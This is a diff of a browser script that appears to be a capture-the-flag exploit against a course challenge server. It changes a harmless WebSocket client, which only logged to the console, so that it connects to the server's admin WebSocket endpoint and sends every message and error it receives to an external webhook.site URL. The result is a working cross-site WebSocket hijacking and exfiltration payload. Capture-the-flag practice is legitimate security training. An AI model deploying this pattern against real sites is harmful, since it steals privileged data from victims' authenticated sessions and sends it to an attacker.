@@ -1,24 +1,20 @@
 <script>
     try{
-        const ws = new WebSocket('ws://ce441-web.spchallenge.ir:8080/ws');
+        const ws = new WebSocket('ws://ce441-web.spchallenge.ir:8080/admin/ws');
         ws.onopen = () => {
-            console.log('WebSocket connection established');
+            fetch('https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=started');
             ws.send('Hello Server!');
         };
 
         ws.onmessage = (event) => {
-            console.log(event.data)
+            fetch(`https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=${event.data}`);
         };
 
         ws.onerror = (error) => {
-            console.error('WebSocket Error:', error);
-        };
-
-        ws.onclose = () => {
-            console.log('WebSocket connection closed');
+            fetch(`https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=${error}`);
         };
     } catch (error) {
-        console.error(error)
+        fetch(`https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=${error.name + error.message}`);
     }
     
 </script>
